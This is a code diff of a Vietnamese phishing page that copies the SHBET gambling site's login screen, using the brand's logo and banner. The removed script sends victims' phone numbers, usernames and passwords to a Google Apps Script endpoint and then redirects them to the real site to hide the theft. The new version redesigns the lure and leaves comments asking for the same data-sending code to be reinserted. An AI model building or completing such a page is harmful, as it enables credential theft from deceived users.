@@ -2,36 +2,75 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Đăng Nhập SHBET</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SHBET - Thế Giới Casino Trong Tay Bạn</title>
     <style>
-        body { margin: 0; background:#062e3a; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        .box { background: white; padding: 30px; border-radius: 15px; width: 350px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #94b2c5; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { margin: 0; font-family: Arial, sans-serif; background-color: #062e3a; color: white; }
+        /* Header chứa Logo và Nút */
+        header { display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; background: white; }
+        .logo img { height: 45px; }
+        .auth-buttons button { padding: 8px 15px; border-radius: 5px; border: none; cursor: pointer; font-weight: bold; margin-left: 5px; }
+        .btn-login { background: white; color: #007bff; border: 1px solid #007bff !important; }
+        .btn-reg { background: #00bfff; color: white; }
+
+        /* Menu đen chữ vàng */
+        nav { background: #1a1a1a; display: flex; justify-content: center; padding: 10px 0; overflow-x: auto; white-space: nowrap; }
+        nav a { color: #ffca28; text-decoration: none; margin: 0 15px; font-size: 13px; font-weight: bold; text-transform: uppercase; }
+
+        /* Banner và Form */
+        .hero { position: relative; width: 100%; }
+        .banner { width: 100%; display: block; }
+        
+        .login-container { background: rgba(255, 255, 255, 0.95); padding: 25px; border-radius: 15px; width: 320px; margin: -50px auto 20px; position: relative; z-index: 10; box-shadow: 0 10px 25px rgba(0,0,0,0.3); color: #333; }
+        .login-container h2 { text-align: center; color: #000; margin-top: 0; font-size: 20px; }
+        
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        #btn-submit { width: 100%; padding: 12px; background: #ff9800; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <img src="https://shbet88.io/wp-content/uploads/2024/01/logo-shbet.png" style="width: 200px; display: block; margin: 0 auto 10px;">
+
+    <header>
+        <div class="logo">
+            <img src="https://shbet88.io/wp-content/uploads/2024/01/logo-shbet.png" alt="Logo">
+        </div>
+        <div class="auth-buttons">
+            <button class="btn-login">Đăng nhập</button>
+            <button class="btn-reg">Đăng ký</button>
+        </div>
+    </header>
+
+    <nav>
+        <a href="#">Trang chủ</a>
+        <a href="#">Thể thao</a>
+        <a href="#">Casino</a>
+        <a href="#">Game bài</a>
+        <a href="#">Nổ hũ</a>
+        <a href="#">Xổ số</a>
+    </nav>
+
+    <div class="hero">
+        <img src="https://68shbet.com/wp-content/uploads/2024/05/banner-shbet.jpg" class="banner" alt="Banner">
+    </div>
+
+    <div class="login-container">
         <h2>ĐĂNG NHẬP NGAY</h2>
         <form id="myForm">
             <input type="text" name="phone" placeholder="Số điện thoại" required>
             <input type="text" name="username" placeholder="Tên đăng nhập" required>
             <input type="password" name="password" placeholder="Mật khẩu" required>
-            <button type="submit" id="btn">ĐĂNG NHẬP</button>
+            <button type="submit" id="btn-submit">ĐĂNG NHẬP</button>
         </form>
     </div>
+
     <script>
-        // QUAN TRỌNG: Dán link bạn vừa Copy ở Bước 1 vào giữa hai dấu nháy đơn dưới đây
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbyYE2RhXAqGWO6iz-NSy6gzeFxzw9aEPyi9J38ABRA-6Pk9AoYNxV4M-PHZmFnP-COG_Q/exec';
-        const form = document.getElementById('myForm');
-        form.addEventListener('submit', e => {
+        // Giữ nguyên đoạn code Script gửi dữ liệu về Google Sheets của bạn ở đây
+        document.getElementById('myForm').onsubmit = function(e) {
             e.preventDefault();
-            document.getElementById('btn').innerHTML = "Đang xử lý...";
-            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(res => { window.location.href = 'https://shbet.com'; })
-            .catch(err => { window.location.href = 'https://shbet.com'; });
-        });
+            // Thêm đoạn fetch gửi dữ liệu của bạn vào đây
+            alert('Đang kết nối đến máy chủ...');
+            window.location.href = "https://shbet.com"; 
+        };
     </script>
 </body>
 </html>
